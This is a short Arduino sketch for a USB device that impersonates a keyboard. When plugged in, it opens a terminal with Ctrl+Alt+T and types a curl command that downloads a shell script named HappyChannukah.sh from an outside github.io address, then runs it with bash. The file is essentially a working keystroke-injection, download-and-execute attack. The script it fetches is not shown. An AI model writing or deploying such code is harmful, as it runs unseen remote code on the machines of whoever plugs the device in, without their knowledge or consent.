#include "Keyboard.h"
// Great Examples at https://www.arduino.cc/en/Tutorial/BuiltInExamples/KeyboardReprogram
// use this option for OSX.
// Comment it out if using Windows or Linux:
// char ctrlKey = KEY_LEFT_GUI;
// use this option for Windows and Linux.
// leave commented out if using OSX:
char ctrlKey = KEY_LEFT_CTRL;
char altKey = KEY_LEFT_ALT;
bool ran=true;

void setup() {
  // initialize control over the keyboard:

  Keyboard.begin();
}

void loop() {

if (ran){
  delay(1000);
  // open cmd prompt
  Keyboard.press(ctrlKey);
  Keyboard.press(altKey);
  Keyboard.press('t');
  delay(200);
  
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println("curl https://someresources.github.io/scripts/HappyChannukah.sh --output happyChannukah.sh");
  delay(1000);
  Keyboard.println("bash happyChannukah.sh");
  delay(1000);
  }
  ran=false;
}
